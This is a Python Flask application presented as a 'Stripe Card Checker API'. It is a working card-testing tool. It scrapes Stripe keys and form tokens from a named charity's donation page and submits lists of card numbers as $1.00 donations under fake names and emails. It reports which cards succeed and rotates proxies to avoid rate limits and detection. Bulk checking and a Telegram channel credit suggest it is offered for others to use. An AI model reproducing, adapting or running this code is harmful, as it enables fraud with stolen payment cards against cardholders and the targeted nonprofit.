from flask import Flask, request, jsonify, send_from_directory
import requests
import re
import random
import time
from faker import Faker
import threading
import queue
import concurrent.futures
from urllib.parse import urlparse
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.proxy_stats = {}
        self.lock = threading.Lock()
    
    def set_proxies(self, proxy_list):
        """Set the proxy list and initialize statistics"""
        with self.lock:
            self.proxies = proxy_list
            self.current_index = 0
            self.proxy_stats = {proxy: {'success': 0, 'fail': 0, 'last_used': 0} for proxy in proxy_list}
    
    def get_next_proxy(self):
        """Get next available proxy with rate limiting"""
        with self.lock:
            if not self.proxies:
                return None
            
            current_time = time.time()
            # Try to find a proxy that hasn't been used in the last 7 seconds
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                last_used = self.proxy_stats[proxy]['last_used']
                if current_time - last_used >= 7:  # 7 seconds cooldown
                    self.proxy_stats[proxy]['last_used'] = current_time
                    return proxy
            
            # If all proxies are in cooldown, wait and return the first one
            time.sleep(1)
            proxy = self.proxies[0]
            self.proxy_stats[proxy]['last_used'] = current_time
            return proxy
    
    def update_proxy_stats(self, proxy, success=True):
        """Update proxy statistics"""
        with self.lock:
            if proxy in self.proxy_stats:
                if success:
                    self.proxy_stats[proxy]['success'] += 1
                else:
                    self.proxy_stats[proxy]['fail'] += 1

class PaymentProcessor:
    def __init__(self, proxy=None):
        self.r = requests.Session()
        self.fake = Faker()
        self.amount = '1.00'
        self.email = f"usera{random.randint(1000,9999)}@gmail.com"
        self.url = 'freedom-ride.org'
        self.payment_user_agent = 'stripe.js%2Fa28b4dac1e%3B+stripe-js-v3%2Fa28b4dac1e%3B+split-card-element'
        self.headers = {
            'authority': 'api.stripe.com',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        # Setup proxy with proper timeout
        if proxy:
            self.proxies = {
                'http': proxy,
                'https': proxy
            }
            # Add proxy authentication if needed
            try:
                parsed = urlparse(proxy)
                if parsed.username and parsed.password:
                    self.proxies = {
                        'http': f"{parsed.scheme}://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}",
                        'https': f"{parsed.scheme}://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
                    }
            except:
                pass
        else:
            self.proxies = None

    def test_proxy_connection(self):
        """Test if proxy is working"""
        try:
            test_response = self.r.get(
                'https://httpbin.org/ip',
                proxies=self.proxies,
                timeout=10
            )
            return test_response.status_code == 200
        except:
            return False

    def get_payment_data(self):
        try:
            r1 = self.r.get(
                f'https://www.{self.url}/donate/', 
                headers=self.headers, 
                proxies=self.proxies,
                timeout=15
            )
            
            if r1.status_code != 200:
                return False, f"Failed to fetch payment page: {r1.status_code}"
                
            r1_text = r1.text
            
            # Extract required payment data
            pk_live_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r1_text)
            acct_match = re.search(r'(acct_[A-Za-z0-9_-]+)', r1_text)
            givewp_match = re.search(r'name="give-form-id" value="(.*?)"', r1_text)
            givewp2_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1_text)
            givewp3_match = re.search(r'name="give-form-hash" value="(.*?)"', r1_text)
            
            if not all([pk_live_match, acct_match, givewp_match, givewp2_match, givewp3_match]):
                return False, "Failed to extract payment parameters"
                
            self.pk_live = pk_live_match.group(1)
            self.acct = acct_match.group(1)
            self.givewp = givewp_match.group(1)
            self.givewp2 = givewp2_match.group(1)
            self.givewp3 = givewp3_match.group(1)
            
            return True, "Success"
            
        except requests.exceptions.Timeout:
            return False, "Timeout while fetching payment data"
        except requests.exceptions.ProxyError:
            return False, "Proxy connection failed"
        except requests.exceptions.ConnectionError:
            return False, "Connection error - check proxy"
        except Exception as e:
            return False, f"Error getting payment data: {str(e)}"

    def process_payment(self, card_data):
        try:
            n, mm, yy, cvc = card_data.split('|')
        except:
            return 'Error: Invalid card format. Use: number|mm|yy|cvc'

        try:
            # Test proxy first
            if not self.test_proxy_connection():
                return 'Error: Proxy connection test failed'

            # Get payment data
            success, message = self.get_payment_data()
            if not success:
                return f'Error: {message}'

            # Create payment method
            data = f'type=card&billing_details[name]={self.fake.first_name()}+{self.fake.last_name()}&billing_details[email]={self.email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent={self.payment_user_agent}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={self.pk_live}&_stripe_account={self.acct}'
            
            r2 = self.r.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.headers, 
                data=data,
                proxies=self.proxies,
                timeout=15
            )
            
            if r2.status_code != 200:
                return f'Error: Payment method creation failed - {r2.text}'
                
            payment_method_id = r2.json()['id']

            # Complete payment
            payment_data = {
                'give-honeypot': '',
                'give-form-id-prefix': self.givewp2,
                'give-form-id': self.givewp,
                'give-form-title': 'Freedom Funds',
                'give-current-url': f'https://www.{self.url}/donate/',
                'give-form-url': f'https://www.{self.url}/donate/',
                'give-form-minimum': self.amount,
                'give-form-maximum': '999999.99',
                'give-form-hash': self.givewp3,
                'give-price-id': 'custom',
                'give-amount': self.amount,
                'give_stripe_payment_method': payment_method_id,
                'payment-mode': 'stripe',
                'give_first': self.fake.first_name(),
                'give_last': self.fake.last_name(),
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': self.email,
                'give_comment': '',
                'card_name': self.fake.name(),
                'give_action': 'purchase',
                'give-gateway': 'stripe',
            }

            r3 = self.r.post(
                f'https://www.{self.url}/donate/', 
                params={'payment-mode': 'stripe', 'form-id': self.givewp}, 
                headers=self.headers, 
                data=payment_data,
                proxies=self.proxies,
                timeout=15
            )
            
            if 'Donation Confirmation' in r3.text:
                return 'CHARGE 1.00$'
            else:
                msg_match = re.search(r':\s*(.*?)<br>', r3.text)
                if msg_match:
                    return msg_match.group(1)
                else:
                    return 'Error: Payment failed - Unknown error'
                    
        except requests.exceptions.Timeout:
            return 'Error: Request timeout - check proxy'
        except requests.exceptions.ProxyError:
            return 'Error: Proxy error - invalid or unreachable proxy'
        except requests.exceptions.ConnectionError:
            return 'Error: Connection failed - check proxy and network'
        except Exception as e:
            return f'Error: {str(e)}'

# Global proxy manager
proxy_manager = ProxyManager()

# Base response template
def base_response(message, status="success"):
    return {
        "status": status,
        "message": message,
        "developer": "@NaN_xax",
        "channel": "https://t.me/+LPjSsuJXV7owMGVk",
        "timestamp": time.time()
    }

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/api/health')
def health_check():
    return jsonify(base_response("API is running"))

@app.route('/api/check', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        card = data.get('card')
        proxy = data.get('proxy')
        
        if not card:
            return jsonify(base_response("Error: Card data is required", "error")), 400
        
        if not proxy:
            return jsonify(base_response("Error: Proxy is required for security", "error")), 400
        
        logger.info(f"Processing card with proxy: {proxy}")
        
        # Create payment processor with proxy
        processor = PaymentProcessor(proxy=proxy)
        
        # Process payment
        result = processor.process_payment(card)
        
        response_data = base_response(result)
        response_data["card"] = card
        response_data["amount"] = processor.amount
        response_data["proxy"] = proxy
        
        if 'CHARGE' in result:
            response_data["status"] = "approved"
        elif 'Error' in result:
            response_data["status"] = "error"
        else:
            response_data["status"] = "declined"
        
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Error in check_card: {str(e)}")
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/api/bulk-check', methods=['POST'])
def bulk_check():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        cards = data.get('cards', [])
        proxy_list = data.get('proxies', [])
        
        if not cards:
            return jsonify(base_response("Error: Cards array is required", "error")), 400
        
        if not proxy_list:
            return jsonify(base_response("Error: Proxies array is required", "error")), 400
        
        if len(cards) > 100:
            return jsonify(base_response("Error: Maximum 100 cards per request", "error")), 400
        
        # Set proxies in proxy manager
        proxy_manager.set_proxies(proxy_list)
        
        results = []
        total_cards = len(cards)
        
        def process_single_card(card_data):
            try:
                proxy = proxy_manager.get_next_proxy()
                if not proxy:
                    return {
                        "card": card_data,
                        "result": "Error: No proxies available",
                        "status": "error"
                    }
                
                processor = PaymentProcessor(proxy=proxy)
                result = processor.process_payment(card_data)
                
                # Update proxy stats
                success = 'CHARGE' in result
                proxy_manager.update_proxy_stats(proxy, success)
                
                return {
                    "card": card_data,
                    "result": result,
                    "status": "approved" if 'CHARGE' in result else "declined",
                    "proxy": proxy
                }
                
            except Exception as e:
                return {
                    "card": card_data,
                    "result": f"Error: {str(e)}",
                    "status": "error"
                }
        
        # Process cards with threading
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            future_to_card = {executor.submit(process_single_card, card): card for card in cards}
            
            for future in concurrent.futures.as_completed(future_to_card):
                card_result = future.result()
                results.append(card_result)
                
                # Add delay between requests to respect rate limiting
                time.sleep(1)
        
        # Calculate statistics
        approved_count = len([r for r in results if r["status"] == "approved"])
        declined_count = len([r for r in results if r["status"] == "declined"])
        error_count = len([r for r in results if r["status"] == "error"])
        
        response_data = base_response("Bulk check completed")
        response_data["results"] = results
        response_data["total_cards"] = total_cards
        response_data["approved_count"] = approved_count
        response_data["declined_count"] = declined_count
        response_data["error_count"] = error_count
        response_data["proxy_count"] = len(proxy_list)
        
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Error in bulk_check: {str(e)}")
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/api/test-proxy', methods=['POST'])
def test_proxy():
    """Endpoint to test proxy connectivity"""
    try:
        data = request.get_json()
        proxy = data.get('proxy')
        
        if not proxy:
            return jsonify(base_response("Error: Proxy is required", "error")), 400
        
        processor = PaymentProcessor(proxy=proxy)
        is_working = processor.test_proxy_connection()
        
        if is_working:
            return jsonify(base_response("Proxy is working correctly"))
        else:
            return jsonify(base_response("Proxy connection failed", "error"))
            
    except Exception as e:
        error_response = base_response(f"Error testing proxy: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/api/proxy-stats')
def get_proxy_stats():
    """Get proxy usage statistics"""
    return jsonify({
        "proxies": proxy_manager.proxies,
        "stats": proxy_manager.proxy_stats,
        "developer": "@NaN_xax",
        "channel": "https://t.me/+LPjSsuJXV7owMGVk"
    })

if __name__ == '__main__':
    # Create a simple HTML file if it doesn't exist
    try:
        with open('index.html', 'r') as f:
            pass
    except FileNotFoundError:
        # Create a basic HTML file
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Stripe Card Checker API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                .endpoint { background: #f5f5f5; padding: 20px; margin: 10px 0; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Stripe Card Checker API</h1>
                <p>API is running successfully. Use the endpoints below:</p>
                
                <div class="endpoint">
                    <h3>POST /api/check</h3>
                    <p>Check a single card</p>
                    <pre>{
    "card": "number|mm|yy|cvv",
    "proxy": "http://proxy:port"
}</pre>
                </div>
                
                <div class="endpoint">
                    <h3>POST /api/bulk-check</h3>
                    <p>Check multiple cards</p>
                    <pre>{
    "cards": ["number|mm|yy|cvv", ...],
    "proxies": ["http://proxy1:port", "http://proxy2:port", ...]
}</pre>
                </div>
                
                <div class="endpoint">
                    <h3>POST /api/test-proxy</h3>
                    <p>Test proxy connectivity</p>
                </div>
                
                <p><strong>Developer:</strong> @NaN_xax</p>
                <p><strong>Channel:</strong> https://t.me/+LPjSsuJXV7owMGVk</p>
            </div>
        </body>
        </html>
        """
        with open('index.html', 'w') as f:
            f.write(html_content)
    
    # Run the application
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
